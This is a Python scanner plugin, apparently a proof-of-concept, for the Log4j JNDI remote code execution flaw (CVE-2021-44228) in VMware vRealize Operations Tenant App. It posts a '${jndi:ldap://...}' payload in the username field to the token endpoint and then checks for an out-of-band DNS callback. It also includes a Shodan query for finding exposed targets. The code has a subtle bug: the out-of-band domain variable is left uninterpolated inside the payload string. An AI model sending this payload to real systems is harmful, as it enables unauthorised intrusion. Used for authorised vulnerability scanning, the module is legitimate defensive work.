import requests
from plugins.oob import verify_request, gen_oob_domain



# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''vRealize Operations Tenant App Log4j JNDI RCE''',
        "description": '''A critical vulnerability in Apache Log4j identified by CVE-2021-44228 has been publicly disclosed that may allow for remote code execution in an impacted vRealize Operations Tenant Application.''',
        "severity": "critical",
        "references": [
            "https://www.vmware.com/security/advisories/VMSA-2021-0028.html"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            "shodan-query":'''http.title:"vRealize Operations Tenant App"'''
        },
        "tags": ["rce", "log4j", "vmware", "vrealize"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        oob_domain,flag = gen_oob_domain()

        path = """/suite-api/api/auth/token/acquire"""
        method = "POST"
        data = """{"username":"${jndi:ldap://${hostName}.oob_domain}","password":"admin"}"""
        headers = {'Content-Type': 'application/json'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if verify_request(type="dns", flag=flag):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url